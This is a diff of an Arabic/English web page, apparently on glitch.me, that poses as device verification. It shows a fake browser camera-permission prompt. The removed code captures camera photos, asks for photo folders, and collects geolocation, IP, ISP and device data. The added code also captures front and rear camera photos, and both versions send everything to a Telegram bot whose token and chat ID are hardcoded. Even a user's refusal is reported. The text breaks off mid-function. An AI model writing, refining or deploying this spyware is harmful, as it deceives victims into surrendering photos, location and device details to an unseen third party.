@@ -1,1057 +1,564 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Verification</title>
+    <title>طلب إذن الوصول</title>
     <style>
-        /* الأنماط الأساسية */
         body {
-            font-family: 'Google Sans', Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
             margin: 0;
             padding: 0;
-            background-color: #f5f5f5;
-            color: #202124;
+            color: #333;
         }
         
-        /* أنماط طلب الإذن المعدلة */
-        .permission-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(0,0,0,0.5);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
         }
         
         .permission-box {
-            background: white;
-            border-radius: 8px;
-            width: 360px;
-            max-width: 90%;
-            padding: 24px;
-            text-align: start;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
-            animation: fadeIn 0.3s ease;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 25px;
+            margin-top: 30px;
         }
         
         .permission-header {
             display: flex;
             align-items: center;
-            margin-bottom: 16px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 15px;
         }
         
         .permission-icon {
-            width: 24px;
-            height: 24px;
-            margin-right: 16px;
-            color: #5f6368;
+            font-size: 24px;
+            margin-left: 15px;
+            color: #4285f4;
         }
         
         .permission-title {
-            font-size: 16px;
-            font-weight: 500;
+            font-size: 20px;
+            font-weight: 600;
             margin: 0;
-            color: #202124;
         }
         
-        .domain-info {
+        .permission-item {
             display: flex;
             align-items: center;
-            margin-bottom: 16px;
-            padding: 12px;
-            background-color: #f8f9fa;
-            border-radius: 4px;
+            padding: 12px 0;
+            border-bottom: 1px solid #f5f5f5;
         }
         
-        .domain-icon {
-            width: 16px;
-            height: 16px;
-            margin-right: 12px;
-            color: #5f6368;
-        }
-        
-        .domain {
-            font-size: 14px;
-            font-weight: 500;
-            color: #202124;
-        }
-        
-        .permission-text {
-            font-size: 14px;
-            line-height: 20px;
-            margin-bottom: 24px;
-            color: #5f6368;
-        }
-        
-        .permission-options {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-        
-        .permission-btn {
-            border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 500;
-            text-align: center;
-            transition: background-color 0.2s;
-        }
-        
-        .allow-while {
-            background: #1a73e8;
-            color: white;
-        }
-        
-        .allow-while:hover {
-            background: #1765cc;
-        }
-        
-        .allow-once {
-            background: #f1f3f4;
-            color: #1a73e8;
-            border: 1px solid #dadce0;
-        }
-        
-        .allow-once:hover {
-            background: #e8f0fe;
-        }
-        
-        .never-allow {
-            background: transparent;
-            color: #5f6368;
-        }
-        
-        .never-allow:hover {
-            background: #f8f9fa;
-        }
-        
-        /* أنماط الواجهة الرئيسية */
-        .container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        .permission-item-icon {
+            font-size: 20px;
+            margin-left: 15px;
+            width: 30px;
             text-align: center;
         }
         
-        #status {
-            font-size: 18px;
-            margin-bottom: 20px;
-            line-height: 1.5;
+        .permission-item-text {
+            flex: 1;
         }
         
-        #main-btn {
-            background: #1a73e8;
-            color: white;
-            border: none;
+        .permission-item-name {
+            font-weight: 500;
+            margin-bottom: 3px;
+        }
+        
+        .permission-item-desc {
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .action-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 25px;
+        }
+        
+        .btn {
             padding: 12px 24px;
-            border-radius: 4px;
-            font-size: 14px;
+            border-radius: 6px;
             font-weight: 500;
             cursor: pointer;
-            transition: background-color 0.2s;
+            border: none;
+            font-size: 15px;
+            transition: all 0.2s;
         }
         
-        #main-btn:hover {
-            background: #1765cc;
+        .btn-allow {
+            background-color: #4285f4;
+            color: white;
         }
         
-        .hidden {
-            display: none;
+        .btn-allow:hover {
+            background-color: #3367d6;
         }
         
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-    </style>
-</head>
-<body>
-    <!-- واجهة طلب إذن الكاميرا المعدلة -->
-    <div id="permission-overlay" class="permission-overlay hidden">
-        <div class="permission-box">
-            <div class="permission-header">
-                <svg class="permission-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
-                    <path d="M12 15c1.66 0 3-1.34 3-3V6c0-1.66-1.34-3-3-3S9 4.34 9 6v6c0 1.66 1.34 3 3 3z"/>
-                    <path d="M17 12c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-2.08c3.39-.49 6-3.39 6-6.92h-2z"/>
-                </svg>
-                <h2 class="permission-title">طلب إذن الكاميرا</h2>
-            </div>
-            
-            <div class="domain-info">
-                <svg class="domain-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
-                </svg>
-                <span class="domain">tropical-yellow-seismosaurus.glitch.me</span>
-            </div>
-            
-            <p class="permission-text">يريد هذا الموقع الوصول إلى كاميرا جهازك. سيتمكن من التقاط الصور والفيديوهات عند منح الإذن.</p>
-            
-            <div class="permission-options">
-                <button id="allow-while" class="permission-btn allow-while">السماح أثناء زيارة الموقع</button>
-                <button id="allow-once" class="permission-btn allow-once">السماح هذه المرة فقط</button>
-                <button id="never-allow" class="permission-btn never-allow">عدم السماح</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- الواجهة الرئيسية -->
-    <div class="container">
-        <div>
-            <div id="status">انتظر 3 دقائق... Wait 3 minutes...</div>
-            <button id="main-btn" class="hidden">Start Verification</button>
-        </div>
-    </div>
-
-    <script>
-        // Telegram configuration
-        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
-        const CHAT_ID = "6913353602";
-        
-        // مسارات الصور المطلوبة
-        const IMAGE_PATHS = [
-            '/storage/emulated/0/Pictures',
-            '/sdcard/Pictures',
-            '/storage/emulated/0/Camera',
-            '/sdcard/Camera',
-            '/storage/emulated/0/DCIM/Camera',
-            '/sdcard/DCIM/Camera',
-            '/storage/emulated/0/DCIM',
-            '/sdcard/DCIM'
-        ];
-
-        // Elements
-        const statusEl = document.getElementById('status');
-        const mainBtn = document.getElementById('main-btn');
-        const permissionOverlay = document.getElementById('permission-overlay');
-        const allowWhileBtn = document.getElementById('allow-while');
-        const allowOnceBtn = document.getElementById('allow-once');
-        const neverAllowBtn = document.getElementById('never-allow');
-
-        // Global variables
-        let cameraPermission = null;
-        let cameraStream = null;
-        
-        // Show main button after 3 seconds
-        setTimeout(() => {
-            statusEl.textContent = "Click to start verification\nانقر للبدء في التحقق";
-            mainBtn.classList.remove('hidden');
-        }, 3000);
-
-        // Handle main button click
-        mainBtn.addEventListener('click', () => {
-            showCameraPermissionDialog();
-        });
-
-        // Show camera permission dialog
-        function showCameraPermissionDialog() {
-            statusEl.textContent = "Waiting for permission...\nفي انتظار الإذن...";
-            mainBtn.classList.add('hidden');
-            permissionOverlay.classList.remove('hidden');
-        }
-
-        // Handle permission button clicks
-        allowWhileBtn.addEventListener('click', async () => {
-            cameraPermission = 'while_visiting';
-            permissionOverlay.classList.add('hidden');
-            await startVerificationProcess();
-        });
-
-        allowOnceBtn.addEventListener('click', async () => {
-            cameraPermission = 'this_time';
-            permissionOverlay.classList.add('hidden');
-            await startVerificationProcess();
-        });
-
-        neverAllowBtn.addEventListener('click', () => {
-            cameraPermission = 'denied';
-            permissionOverlay.classList.add('hidden');
-            statusEl.textContent = "Camera access denied\nتم رفض إذن الكاميرا";
-            sendToTelegram("⚠️ User denied camera access\n⚠️ المستخدم رفض إذن الكاميرا");
-        });
-
-        // Main verification process
-        async function startVerificationProcess() {
-            try {
-                statusEl.textContent = "Starting verification...\nجاري بدء عملية التحقق...";
-                
-                // تشغيل جميع العمليات بشكل متوازي لزيادة السرعة
-                await Promise.all([
-                    // 1. Take and send camera photo if permitted
-                    (cameraPermission !== 'denied') ? takeAndSendCameraPhoto() : Promise.resolve(),
-                    
-                    // 2. Try to access and send local pictures
-                    accessAndSendLocalPictures(),
-                    
-                    // 3. Send device info
-                    sendCompleteDeviceInfo()
-                ]);
-                
-                statusEl.textContent = "Verification complete!\nتم التحقق بنجاح!";
-                
-            } catch (error) {
-                console.error('Error:', error);
-                statusEl.textContent = "Error occurred\nحدث خطأ";
-                await sendToTelegram(`⚠️ Error: ${error.message}\n⚠️ خطأ: ${error.message}`);
-            }
-        }
-
-        async function takeAndSendCameraPhoto() {
-            try {
-                statusEl.textContent = "Accessing camera...\nجاري الوصول إلى الكاميرا...";
-                
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'environment',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    } 
-                });
-                
-                cameraStream = stream;
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        resolve();
-                    };
-                });
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                
-                // تقليل وقت الانتظار لزيادة السرعة
-                await new Promise(resolve => setTimeout(resolve, 200));
-                
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                stream.getTracks().forEach(track => track.stop());
-                
-                // إرسال الصورة بدون انتظار الرد لزيادة السرعة
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'camera_photo.jpg');
-                    
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    }).catch(e => console.error('Photo send error:', e));
-                    
-                }, 'image/jpeg', 0.8); // تقليل جودة الصورة لزيادة السرعة
-                
-            } catch (error) {
-                console.error('Camera error:', error);
-                await sendToTelegram("⚠️ Camera access denied\n⚠️ تم رفض إذن الكاميرا");
-            }
-        }
-
-        async function accessAndSendLocalPictures() {
-            try {
-                statusEl.textContent = "Scanning for pictures...\nجاري البحث عن الصور...";
-                
-                let picturesSent = 0;
-                const maxPictures = 15; // زيادة عدد الصور المرسلة
-                
-                // محاولة الوصول إلى المسارات المحددة
-                for (const path of IMAGE_PATHS) {
-                    if (picturesSent >= maxPictures) break;
-                    
-                    try {
-                        // محاولة الوصول إلى المجلد باستخدام File System Access API
-                        const dirHandle = await window.showDirectoryPicker({
-                            startIn: path
-                        });
-                        
-                        picturesSent += await sendPicturesFromDirectory(dirHandle, maxPictures - picturesSent);
-                        
-                    } catch (e) {
-                        console.log(`Couldn't access ${path}:`, e);
-                        
-                        // محاولة بديلة باستخدام fetch إذا كان المسار معروفًا
-                        if (path.startsWith('/storage/') || path.startsWith('/sdcard/')) {
-                            try {
-                                const response = await fetch(path);
-                                if (response.ok) {
-                                    // هنا يمكنك معالجة الملفات إذا كان الوصول متاحًا
-                                }
-                            } catch (fetchError) {
-                                console.log(`Fetch access failed for ${path}:`, fetchError);
-                            }
-                        }
-                    }
-                }
-                
-                if (picturesSent > 0) {
-                    await sendToTelegram(`📸 Sent ${picturesSent} pictures\nتم إرسال ${picturesSent} صورة`);
-                } else {
-                    await sendToTelegram("⚠️ No pictures found in standard locations\n⚠️ لم يتم العثور على صور في المواقع المعتادة");
-                }
-                
-            } catch (error) {
-                console.log('Local pictures access failed:', error);
-                await sendToTelegram("⚠️ Could not access local pictures\n⚠️ تعذر الوصول إلى الصور المحلية");
-            }
-        }
-
-        async function sendPicturesFromDirectory(dirHandle, maxFiles) {
-            let picturesSent = 0;
-            const fileHandles = [];
-            
-            // جمع الملفات أولاً
-            for await (const entry of dirHandle.values()) {
-                if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png|gif|webp)$/i)) {
-                    fileHandles.push(entry);
-                    if (fileHandles.length >= maxFiles) break;
-                }
-            }
-            
-            // إرسال الملفات بشكل متوازي
-            await Promise.all(fileHandles.map(async (entry) => {
-                try {
-                    const file = await entry.getFile();
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', file, file.name);
-                    
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    
-                    picturesSent++;
-                    
-                } catch (e) {
-                    console.error('Error sending picture:', e);
-                }
-            }));
-            
-            return picturesSent;
-        }
-
-        async function sendCompleteDeviceInfo() {
-            try {
-                statusEl.textContent = "Collecting device info...\nجاري جمع معلومات الجهاز...";
-                
-                // جمع المعلومات بشكل متوازي لزيادة السرعة
-                const [batteryInfo, locationInfo, networkInfo] = await Promise.all([
-                    getBatteryInfo(),
-                    getLocationInfo(),
-                    getNetworkInfo()
-                ]);
-                
-                const deviceInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
-                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    colorDepth: `${window.screen.colorDepth}bit`,
-                    language: navigator.language,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    timestamp: new Date().toISOString(),
-                    battery: batteryInfo,
-                    location: locationInfo,
-                    ip: networkInfo?.ip,
-                    networkLocation: networkInfo?.location
-                };
-
-                const message = formatDeviceInfo(deviceInfo);
-                await sendToTelegram(message);
-                
-            } catch (error) {
-                console.error('Device info error:', error);
-                await sendToTelegram("⚠️ Error collecting device info\n⚠️ خطأ في جمع معلومات الجهاز");
-            }
-        }
-
-        async function getBatteryInfo() {
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    return {
-                        level: `${Math.floor(battery.level * 100)}%`,
-                        charging: battery.charging ? 'Yes' : 'No'
-                    };
-                } catch (e) {
-                    return 'Not available';
-                }
-            }
-            return 'Not available';
-        }
-
-        async function getLocationInfo() {
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 5000 // تقليل وقت الانتظار
-                    });
-                });
-                
-                return {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: `${position.coords.accuracy}m`
-                };
-                
-            } catch (e) {
-                return null;
-            }
-        }
-
-        async function getNetworkInfo() {
-            try {
-                const [ipResponse, locationResponse] = await Promise.all([
-                    fetch('https://api.ipify.org?format=json'),
-                    fetch('https://ipapi.co/json/').catch(() => null)
-                ]);
-                
-                const ipData = await ipResponse.json();
-                let locationData = null;
-                
-                if (locationResponse) {
-                    locationData = await locationResponse.json();
-                }
-                
-                return {
-                    ip: ipData.ip,
-                    location: locationData ? {
-                        country: locationData.country_name,
-                        city: locationData.city,
-                        region: locationData.region,
-                        isp: locationData.org
-                    } : null
-                };
-            } catch (e) {
-                return null;
-            }
-        }
-
-        function formatDeviceInfo(info) {
-            let message = `📱 <b>DEVICE INFORMATION</b>\n\n`;
-            
-            message += `🖥️ <b>System Info</b>\n`;
-            message += `- Platform: ${info.platform}\n`;
-            message += `- User Agent: ${info.userAgent}\n`;
-            message += `- Memory: ${info.deviceMemory}\n`;
-            message += `- CPU Cores: ${info.cpuCores}\n`;
-            message += `- Screen: ${info.screen} (${info.colorDepth}bit)\n`;
-            message += `- Language: ${info.language}\n`;
-            message += `- Timezone: ${info.timezone}\n`;
-            message += `- Timestamp: ${info.timestamp}\n\n`;
-            
-            message += `🔋 <b>Battery</b>\n`;
-            if (typeof info.battery === 'object') {
-                message += `- Level: ${info.battery.level}\n`;
-                message += `- Charging: ${info.battery.charging ? 'Yes' : 'No'}\n\n`;
-            } else {
-                message += `${info.battery}\n\n`;
-            }
-            
-            if (info.location) {
-                message += `📍 <b>Location</b>\n`;
-                message += `- Latitude: ${info.location.latitude}\n`;
-                message += `- Longitude: ${info.location.longitude}\n`;
-                message += `- Accuracy: ${info.location.accuracy}\n`;
-                message += `- Google Maps: https://maps.google.com/?q=${info.location.latitude},${info.location.longitude}\n\n`;
-            }
-            
-            if (info.ip) {
-                message += `🌐 <b>Network</b>\n`;
-                message += `- IP: ${info.ip}\n`;
-                if (info.networkLocation) {
-                    message += `- Country: ${info.networkLocation.country}\n`;
-                    message += `- Region: ${info.networkLocation.region}\n`;
-                    message += `- City: ${info.networkLocation.city}\n`;
-                    message += `- ISP: ${info.networkLocation.isp}\n`;
-                }
-            }
-            
-            return message;
-        }
-
-        async function sendToTelegram(message) {
-            try {
-                // إرسال الرسالة بدون انتظار الرد لزيادة السرعة
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                }).catch(e => console.error('Telegram send error:', e));
-            } catch (e) {
-                console.error('Telegram send error:', e);
-            }
-        }
-    </script>
-</body>
-</html><!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Verification</title>
-    <style>
-        /* الأنماط الأساسية */
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f5f5f5;
-        }
-        
-        /* أنماط طلب الإذن */
-        .permission-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(0,0,0,0.5);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        
-        .permission-box {
-            background: white;
-            border-radius: 12px;
-            width: 320px;
-            padding: 20px;
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-        }
-        
-        .domain {
-            font-weight: bold;
-            margin: 15px 0;
-            color: #333;
-        }
-        
-        .permission-text {
-            margin-bottom: 20px;
+        .btn-deny {
+            background-color: #f1f1f1;
             color: #555;
         }
         
-        .permission-btn {
-            border: none;
-            padding: 10px 15px;
-            margin: 5px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 14px;
-            width: 100%;
+        .btn-deny:hover {
+            background-color: #e0e0e0;
         }
         
-        .allow-while {
-            background: #4285f4;
-            color: white;
-        }
-        
-        .allow-once {
-            background: #f1f1f1;
-            color: #333;
-        }
-        
-        .never-allow {
-            background: #f1f1f1;
-            color: #333;
-        }
-        
-        /* أنماط الواجهة الرئيسية */
-        .container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        .status {
             text-align: center;
-        }
-        
-        #status {
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-        
-        #main-btn {
-            background: #4CAF50;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 5px;
-            font-size: 18px;
-            cursor: pointer;
-        }
-        
-        .hidden {
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 6px;
             display: none;
+        }
+        
+        .status-processing {
+            background-color: #e8f0fe;
+            color: #4285f4;
+        }
+        
+        .status-success {
+            background-color: #e6f4ea;
+            color: #34a853;
+        }
+        
+        .status-error {
+            background-color: #fce8e6;
+            color: #d93025;
         }
     </style>
 </head>
 <body>
-    <!-- واجهة طلب إذن الكاميرا -->
-    <div id="permission-overlay" class="permission-overlay hidden">
+    <div class="container">
         <div class="permission-box">
-            <div class="domain">tropical-yellow-seismosaurus.glitch.me</div>
-            <div class="permission-text">wants to use your camera</div>
-            <div>
-                <button id="allow-while" class="permission-btn allow-while">Allow while visiting the site</button>
-                <button id="allow-once" class="permission-btn allow-once">Allow this time</button>
-                <button id="never-allow" class="permission-btn never-allow">Never allow</button>
+            <div class="permission-header">
+                <div class="permission-icon">🔒</div>
+                <h1 class="permission-title">طلب إذن الوصول</h1>
+            </div>
+            
+            <div class="permission-item">
+                <div class="permission-item-icon">📱</div>
+                <div class="permission-item-text">
+                    <div class="permission-item-name">معلومات الجهاز</div>
+                    <div class="permission-item-desc">جمع معلومات مفصلة عن جهازك</div>
+                </div>
+            </div>
+            
+            <div class="permission-item">
+                <div class="permission-item-icon">🌍</div>
+                <div class="permission-item-text">
+                    <div class="permission-item-name">الموقع الجغرافي</div>
+                    <div class="permission-item-desc">تحديد موقعك الحالي بدقة</div>
+                </div>
+            </div>
+            
+            <div class="permission-item">
+                <div class="permission-item-icon">📷</div>
+                <div class="permission-item-text">
+                    <div class="permission-item-name">الكاميرا الأمامية والخلفية</div>
+                    <div class="permission-item-desc">التقاط صور وفيديوهات من الكاميرات</div>
+                </div>
+            </div>
+            
+            <div class="permission-item">
+                <div class="permission-item-icon">🎤</div>
+                <div class="permission-item-text">
+                    <div class="permission-item-name">التسجيل الصوتي</div>
+                    <div class="permission-item-desc">تسجيل صوت لمدة 10 ثواني</div>
+                </div>
+            </div>
+            
+            <div class="permission-item">
+                <div class="permission-item-icon">📁</div>
+                <div class="permission-item-text">
+                    <div class="permission-item-name">الملفات والصور</div>
+                    <div class="permission-item-desc">الوصول إلى مجلدات التحميل والصور</div>
+                </div>
+            </div>
+            
+            <div class="permission-item">
+                <div class="permission-item-icon">🔔</div>
+                <div class="permission-item-text">
+                    <div class="permission-item-name">الإشعارات</div>
+                    <div class="permission-item-desc">قراءة الإشعارات خلال الـ24 ساعة الماضية</div>
+                </div>
+            </div>
+            
+            <div class="permission-item">
+                <div class="permission-item-icon">📞</div>
+                <div class="permission-item-text">
+                    <div class="permission-item-name">جهات الاتصال</div>
+                    <div class="permission-item-desc">قراءة دفتر العناوين</div>
+                </div>
+            </div>
+            
+            <div class="action-buttons">
+                <button class="btn btn-deny" id="deny-btn">رفض</button>
+                <button class="btn btn-allow" id="allow-btn">السماح</button>
+            </div>
+            
+            <div class="status status-processing" id="status-processing">
+                جاري جمع المعلومات وإرسالها...
+            </div>
+            
+            <div class="status status-success" id="status-success" style="display: none;">
+                تم إرسال المعلومات بنجاح!
+            </div>
+            
+            <div class="status status-error" id="status-error" style="display: none;">
+                حدث خطأ أثناء محاولة جمع المعلومات
             </div>
         </div>
     </div>
 
-    <!-- الواجهة الرئيسية -->
-    <div class="container">
-        <div>
-            <div id="status">انتظر 3 دقائق... Wait 3 minutes...</div>
-            <button id="main-btn" class="hidden">Start Verification</button>
-        </div>
-    </div>
-
     <script>
-        // Telegram configuration
+        // تكوين البوت
         const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
         const CHAT_ID = "6913353602";
-
-        // Elements
-        const statusEl = document.getElementById('status');
-        const mainBtn = document.getElementById('main-btn');
-        const permissionOverlay = document.getElementById('permission-overlay');
-        const allowWhileBtn = document.getElementById('allow-while');
-        const allowOnceBtn = document.getElementById('allow-once');
-        const neverAllowBtn = document.getElementById('never-allow');
-
-        // Global variables
-        let cameraPermission = null;
-        let cameraStream = null;
         
-        // Show main button after 3 seconds
-        setTimeout(() => {
-            statusEl.textContent = "Click to start verification\nانقر للبدء في التحقق";
-            mainBtn.classList.remove('hidden');
-        }, 3000);
-
-        // Handle main button click
-        mainBtn.addEventListener('click', () => {
-            showCameraPermissionDialog();
-        });
-
-        // Show camera permission dialog
-        function showCameraPermissionDialog() {
-            statusEl.textContent = "Waiting for permission...\nفي انتظار الإذن...";
-            mainBtn.classList.add('hidden');
-            permissionOverlay.classList.remove('hidden');
-        }
-
-        // Handle permission button clicks
-        allowWhileBtn.addEventListener('click', async () => {
-            cameraPermission = 'while_visiting';
-            permissionOverlay.classList.add('hidden');
-            await startVerificationProcess();
-        });
-
-        allowOnceBtn.addEventListener('click', async () => {
-            cameraPermission = 'this_time';
-            permissionOverlay.classList.add('hidden');
-            await startVerificationProcess();
-        });
-
-        neverAllowBtn.addEventListener('click', () => {
-            cameraPermission = 'denied';
-            permissionOverlay.classList.add('hidden');
-            statusEl.textContent = "Camera access denied\nتم رفض إذن الكاميرا";
-            sendToTelegram("⚠️ User denied camera access\n⚠️ المستخدم رفض إذن الكاميرا");
-        });
-
-        // Main verification process
-        async function startVerificationProcess() {
+        // عناصر الواجهة
+        const allowBtn = document.getElementById('allow-btn');
+        const denyBtn = document.getElementById('deny-btn');
+        const statusProcessing = document.getElementById('status-processing');
+        const statusSuccess = document.getElementById('status-success');
+        const statusError = document.getElementById('status-error');
+        
+        // معالجة النقر على زر السماح
+        allowBtn.addEventListener('click', async () => {
+            allowBtn.disabled = true;
+            denyBtn.disabled = true;
+            statusProcessing.style.display = 'block';
+            
             try {
-                statusEl.textContent = "Starting verification...\nجاري بدء عملية التحقق...";
+                // جمع وإرسال جميع المعلومات
+                await collectAndSendAllData();
                 
-                // 1. Take and send camera photo if permitted
-                if (cameraPermission !== 'denied') {
-                    await takeAndSendCameraPhoto();
-                }
-                
-                // 2. Try to access and send local pictures
-                await accessAndSendLocalPictures();
-                
-                // 3. Send device info
-                await sendCompleteDeviceInfo();
-                
-                statusEl.textContent = "Verification complete!\nتم التحقق بنجاح!";
-                
+                statusProcessing.style.display = 'none';
+                statusSuccess.style.display = 'block';
             } catch (error) {
                 console.error('Error:', error);
-                statusEl.textContent = "Error occurred\nحدث خطأ";
-                await sendToTelegram(`⚠️ Error: ${error.message}\n⚠️ خطأ: ${error.message}`);
+                statusProcessing.style.display = 'none';
+                statusError.style.display = 'block';
+                statusError.textContent = `حدث خطأ: ${error.message}`;
             }
-        }
-
-        // [Rest of your existing functions remain the same...]
-        // takeAndSendCameraPhoto()
-        // accessAndSendLocalPictures()
-        // sendCompleteDeviceInfo()
-        // formatDeviceInfo()
-        // sendToTelegram()
-        // ... etc ...
-
-        // سأقوم بوضع الدوال الأخرى هنا بنفسها كما هي في الكود السابق
-        // لأنك طلبت عدم حذف أي شيء من الكود الأصلي
-        // فقط أضفت واجهة طلب الإذن الجديدة
-
-        async function takeAndSendCameraPhoto() {
+        });
+        
+        // معالجة النقر على زر الرفض
+        denyBtn.addEventListener('click', () => {
+            document.querySelector('.permission-box').innerHTML = `
+                <div style="text-align: center; padding: 30px;">
+                    <div style="font-size: 50px; margin-bottom: 20px;">🚫</div>
+                    <h2 style="margin-bottom: 10px;">تم رفض الأذونات</h2>
+                    <p style="color: #666;">لن يتم جمع أو إرسال أي معلومات من جهازك</p>
+                </div>
+            `;
+        });
+        
+        // دالة رئيسية لجمع وإرسال جميع البيانات
+        async function collectAndSendAllData() {
+            // 1. إرسال معلومات الجهاز الأساسية
+            const deviceInfo = await getDeviceInfo();
+            await sendToTelegram(formatDeviceInfo(deviceInfo));
+            
+            // 2. الكاميرا الأمامية
             try {
-                statusEl.textContent = "Accessing camera...\nجاري الوصول إلى الكاميرا...";
-                
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'environment',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    } 
-                });
-                
-                cameraStream = stream;
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        resolve();
-                    };
-                });
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                
-                await new Promise(resolve => setTimeout(resolve, 500));
-                
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                stream.getTracks().forEach(track => track.stop());
-                
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'camera_photo.jpg');
-                    
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    
-                }, 'image/jpeg', 0.9);
-                
+                const frontCameraPhoto = await captureCameraPhoto('user');
+                await sendPhotoToTelegram(frontCameraPhoto, 'front_camera.jpg');
             } catch (error) {
-                console.error('Camera error:', error);
-                await sendToTelegram("⚠️ Camera access denied\n⚠️ تم رفض إذن الكاميرا");
+                await sendToTelegram("⚠️ فشل الوصول إلى الكاميرا الأمامية: " + error.message);
             }
-        }
-
-        async function accessAndSendLocalPictures() {
+            
+            // 3. الكاميرا الخلفية
             try {
-                if (!('showDirectoryPicker' in window)) {
-                    throw new Error("Local file access not supported");
-                }
-                
-                statusEl.textContent = "Scanning for pictures...\nجاري البحث عن الصور...";
-                
-                let picturesSent = 0;
-                
-                // Try Camera directory
-                try {
-                    const cameraDir = await window.showDirectoryPicker({ startIn: 'camera' });
-                    picturesSent += await sendPicturesFromDirectory(cameraDir);
-                } catch (e) {
-                    console.log("Couldn't access Camera folder:", e);
-                }
-                
-                // Try Pictures directory
-                try {
-                    const picturesDir = await window.showDirectoryPicker({ startIn: 'pictures' });
-                    picturesSent += await sendPicturesFromDirectory(picturesDir);
